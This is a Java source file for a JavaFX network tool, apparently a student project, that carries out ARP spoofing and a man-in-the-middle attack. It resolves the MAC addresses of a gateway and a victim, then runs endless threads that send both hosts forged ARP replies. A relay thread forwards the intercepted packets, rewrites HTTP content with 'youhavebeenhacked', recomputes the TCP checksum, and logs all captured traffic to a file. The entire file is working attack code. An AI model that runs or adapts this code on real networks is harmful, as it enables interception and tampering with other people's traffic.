package controller;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;
import org.jnetpcap.protocol.tcpip.Http;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Pseudo_header;
import model.TCP_header;
import model.Util;

public class Controller implements Initializable{
	@FXML
	private ListView<String> networkListView;
	@FXML
	private TextArea textArea;
	@FXML
	private Button pickButton;
	@FXML
	private TextField myIP;
	@FXML
	private TextField senderIP;
	@FXML
	private TextField targetIP;
	@FXML
	private Button getMACButton;
	
	
	ObservableList<String> networkList = FXCollections.observableArrayList();
	
	private ArrayList<PcapIf> allDevs = null;
	
	@Override
	public void initialize(URL location, ResourceBundle resources) {
		allDevs = new ArrayList<PcapIf>();
		StringBuilder errbuf = new StringBuilder();
		int r = Pcap.findAllDevs(allDevs,  errbuf);
		if (r == Pcap.NOT_OK || allDevs.isEmpty()) {
			textArea.appendText("找不到适配器.\n"+ errbuf.toString() + "\n");
			return;
		}
		textArea.appendText("找到了适配器. \n选择一个适配器.\n");
		for (PcapIf device : allDevs) {
			networkList.add(device.getName() + " " + ((device.getDescription() != null) ? device.getDescription() : "无相关描述"));
		}
		networkListView.setItems(networkList);	
	}
	public void networkPickAction() {
		if(networkListView.getSelectionModel().getSelectedIndex() < 0) {
			return;
		}
		Main.device = allDevs.get(networkListView.getSelectionModel().getSelectedIndex());
		networkListView.setDisable(true);
		pickButton.setDisable(true);
		
		int snaplen = 64 * 1024;
		int flags = Pcap.MODE_PROMISCUOUS;
		int timeout = 1;
		
		StringBuilder errbuf = new StringBuilder();
		Main.pcap = Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf);
		if(Main.pcap == null) {
			textArea.appendText("无法打开适配器.\n" + errbuf.toString() + "\n");
			return;
		}
		textArea.appendText("选择的适配器: " + Main.device.getName() + "\n");
		textArea.appendText("激活了适配器.\n");
		
	}
	
	public void getMACAction() {
		if(!pickButton.isDisable()) {
			textArea.appendText("先选择适配器. \n");
			return;
		}
		ARP arp = new ARP();
		Ethernet eth = new Ethernet();
		PcapHeader header = new PcapHeader(JMemory.POINTER);
		JBuffer buf = new JBuffer(JMemory.POINTER);
		ByteBuffer buffer = null;
		
		int id = JRegistry.mapDLTToId(Main.pcap.datalink());
		
		try {
			Main.myMAC = Main.device.getHardwareAddress();
			Main.myIP = InetAddress.getByName(myIP.getText()).getAddress();
			Main.senderIP = InetAddress.getByName(senderIP.getText()).getAddress();
			Main.targetIP = InetAddress.getByName(targetIP.getText()).getAddress();
		}catch (Exception e) {
			textArea.appendText("IP 地址错误.\n");;
			return;
		}

		myIP.setDisable(true);
		senderIP.setDisable(true);
		targetIP.setDisable(true);
		getMACButton.setDisable(true);
		
		arp = new ARP();
		arp.makeARPRequest(Main.myMAC, Main.myIP, Main.targetIP);
		buffer = ByteBuffer.wrap(arp.getPacket());
		if(Main.pcap.sendPacket(buffer) != Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("向target发送了ARP Request.\n"+
				Util.bytesToString(arp.getPacket())+"\n");
		
		long targetStartTime = System.currentTimeMillis();
		Main.targetMAC = new byte[6];
		while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
			if(System.currentTimeMillis()-targetStartTime >= 500) {
				textArea.appendText("target无反应.\n");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf);
			packet.scan(id);
			byte[] sourceIP = new byte[4];
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
			if (packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06 //ARP인지 확인
					&& packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02 //ARP Reply 인지 확인
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.targetIP))
					&& packet.hasHeader(eth)) {
				Main.targetMAC = eth.source();
				break;
			} else {
				continue;
			}				
		}
		textArea.appendText("target的MAC 地址: "+
				Util.bytesToString(Main.targetMAC) + "\n");
		
		
		
		
		arp = new ARP();
		arp.makeARPRequest(Main.myMAC, Main.myIP, Main.senderIP);
		buffer = ByteBuffer.wrap(arp.getPacket());
		if(Main.pcap.sendPacket(buffer) != Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("向sender发送了 ARP Request.\n"+
				Util.bytesToString(arp.getPacket())+"\n");
		
		long senderStartTime = System.currentTimeMillis();
		Main.senderMAC = new byte[6];
		while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
			if(System.currentTimeMillis()-senderStartTime >= 500) {
				textArea.appendText("sender无反应.\n");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf);
			packet.scan(id);
			byte[] sourceIP = new byte[4];
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
			if (packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06 //ARP인지 확인
					&& packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02 //ARP Reply 인지 확인
					&& Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.senderIP))
					&& packet.hasHeader(eth)) {
				Main.senderMAC = eth.source();
				break;
			} else {
				continue;
			}				
		}
		textArea.appendText("sender的 MAC 地址: "+
				Util.bytesToString(Main.senderMAC) + "\n");
		
		new SenderARPSpoofing().start();
		new TargetARPSpoofing().start();
		new ARPRelay().start();
	}
	
	class SenderARPSpoofing extends Thread{
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.senderMAC, Main.myMAC, Main.myMAC, Main.targetIP, Main.senderMAC, Main.senderIP);
			//(byte[] destinationMAC, byte[] sourceMAC, byte[] senderMAC,byte[] senderIP, byte[] targetMAC, byte[] targetIP)
			//Sender에게, 게이트웨이에게 target IP 를 가진 사람이 자신이라고, myMAC이라고 말하는 거다.
			//sourceMAC, senderMAC의 차이점은 뭘까???
			Platform.runLater(()->{
				textArea.appendText("向sender继续发送感染的 ARP Reply packet.\n");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch(Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	class TargetARPSpoofing extends Thread{
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.targetMAC, Main.myMAC, Main.myMAC, Main.senderIP, Main.targetMAC, Main.targetIP);
			//(byte[] destinationMAC, byte[] sourceMAC, byte[] senderMAC,byte[] senderIP, byte[] targetMAC, byte[] targetIP)
			//Sender에게, 게이트웨이에게 target IP 를 가진 사람이 자신이라고, myMAC이라고 말하는 거다.
			//sourceMAC, senderMAC의 차이점은 뭘까???
			Platform.runLater(()-> {
				textArea.appendText("向target继续发送 ARP Reply packet.\n");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch(Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	class ARPRelay extends Thread {
		@Override
		public void run() {
			Ip4 ip = new Ip4();
			Http http = new Http();
			PcapHeader header = new PcapHeader(JMemory.POINTER);
			JBuffer buf = new JBuffer(JMemory.POINTER);
			Platform.runLater(() -> {
				textArea.appendText("进行ARP Relay.\n");
			});
			
			try {
			PrintStream out = new PrintStream(new FileOutputStream("C:\\Users\\YeB\\Desktop\\output.txt"));
			System.setOut(out);
			
			while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
				PcapPacket packet = new PcapPacket(header, buf);
				int id = JRegistry.mapDLTToId(Main.pcap.datalink());
				packet.scan(id);
				byte[] data = packet.getByteArray(0, packet.size());
				byte[] tempDestinationMAC = new byte[6];
				byte[] tempSourceMAC = new byte[6];
				
				System.arraycopy(data,  0,  tempDestinationMAC,  0,  6);
				System.arraycopy(data,  6,  tempSourceMAC,  0,  6);
				
					String original = "aaaaaaaaaaaaaaaaa";
					String modified = "youhavebeenhacked";
					if(Util.indexOf(data, original.getBytes()) != -1) {
						//先对内容进行篡改 
						System.arraycopy(modified.getBytes(), 0, data, Util.indexOf(data, original.getBytes()), original.length());
						
						//后计算checksum
						Pseudo_header psh = new Pseudo_header();
						TCP_header tcph = new TCP_header();
						
						System.arraycopy(data, 26, psh.sourceIP, 0, 4);
						System.arraycopy(data, 30, psh.destinationIP, 0, 4);
						
						System.arraycopy(data, 34, tcph.sourcePort, 0, 2);
						System.arraycopy(data, 36, tcph.destinationPort, 0, 2);
						System.arraycopy(data, 38, tcph.sequence, 0, 4);
						System.arraycopy(data, 42, tcph.ackSeq, 0, 4);
						System.arraycopy(data, 47, tcph.flag, 0, 1);
						System.arraycopy(data, 48, tcph.windowSize, 0, 2);
						byte[] tcpdata = new byte[data.length-54];
						System.arraycopy(data, 54, tcpdata, 0, data.length-54);
						byte[] chk = new byte[12+20+tcpdata.length];
						int tcpLen = 20+tcpdata.length;
						psh.tcpLen[0] = (byte)(tcpLen >> 8 & 0xFF);
						psh.tcpLen[1] = (byte)(tcpLen & 0xFF);
						
						int index = 0;
						System.arraycopy(psh.sourceIP, 0, chk, index, 4); index += 4;
						System.arraycopy(psh.destinationIP, 0, chk, index, 4); index += 4;
						System.arraycopy(psh.reserved, 0, chk, index, 1); index += 1;
						System.arraycopy(psh.protocol, 0, chk, index, 1); index += 1;
						System.arraycopy(psh.tcpLen, 0, chk, index, 2); index += 2;
						
						System.arraycopy(tcph.sourcePort, 0, chk, index, 2); index += 2;
						System.arraycopy(tcph.destinationPort, 0, chk, index, 2); index += 2;
						System.arraycopy(tcph.sequence, 0, chk, index, 4); index += 4;
						System.arraycopy(tcph.ackSeq, 0, chk, index, 4); index += 4;
						System.arraycopy(tcph.dataOffsetAndReserv, 0, chk, index, 1); index += 1;
						System.arraycopy(tcph.flag, 0, chk, index, 1); index += 1;
						System.arraycopy(tcph.windowSize, 0, chk, index, 2); index += 2;
						System.arraycopy(tcph.checksum, 0, chk, index, 2); index += 2;
						System.arraycopy(tcph.urgentPtr, 0, chk, index, 2); index += 2;
						
						System.arraycopy(tcpdata, 0, chk, index, tcpdata.length);
						
						int tcp_checksum;
						tcp_checksum = Util.checksum(chk, chk.length, 0);
						byte[] tcp_checksumb = new byte[2];
						tcp_checksumb[0] = (byte)(tcp_checksum >> 8 & 0xFF);
						tcp_checksumb[1] = (byte)(tcp_checksum & 0xFF);
						
						
						//篡改checksum
						System.arraycopy(tcp_checksumb, 0, data, 50, 2);
						
						Platform.runLater(() -> {
							textArea.appendText("进行篡改http packet.\n");
						});
					}
				 	
				
				if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC)) &&
						Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.myMAC))) {
					if(packet.hasHeader(ip)) {
						if(Util.bytesToString(ip.source()).equals(Util.bytesToString(Main.myIP))) {
							System.arraycopy(Main.targetMAC, 0, data, 0, 6);
							ByteBuffer buffer = ByteBuffer.wrap(data);
							Main.pcap.sendPacket(buffer);
						}  
					}
				}
				//sender, 게이트웨이에서 해커한테 발송한 패킷 (게이트웨이는 해커를 target으로 착각)
				else if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC)) &&
						Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.senderMAC))) {
					if(packet.hasHeader(ip)) {
						System.arraycopy(Main.targetMAC, 0, data, 0, 6);
						System.arraycopy(Main.myMAC, 0, data, 6, 6);
						ByteBuffer buffer = ByteBuffer.wrap(data);
						Main.pcap.sendPacket(buffer);
						  
					}
				}
				//target에서 해커한테 발송한 패킷 (target은 해커를 게이트웨이로 착각중)
				else if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC)) &&
						Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.targetMAC))) {
					if(packet.hasHeader(ip)) {
						System.arraycopy(Main.senderMAC, 0, data, 0, 6);
						System.arraycopy(Main.myMAC, 0, data, 6, 6);
						ByteBuffer buffer = ByteBuffer.wrap(data);
						Main.pcap.sendPacket(buffer);
					}
				}
				out.println(Util.bytesToString(buf.getByteArray(0,  buf.size())));
				System.out.println(Util.bytesToString(buf.getByteArray(0,  buf.size())));
			}
			out.close();
			}catch(IOException e) {
				e.printStackTrace();
			}
		}
	}
}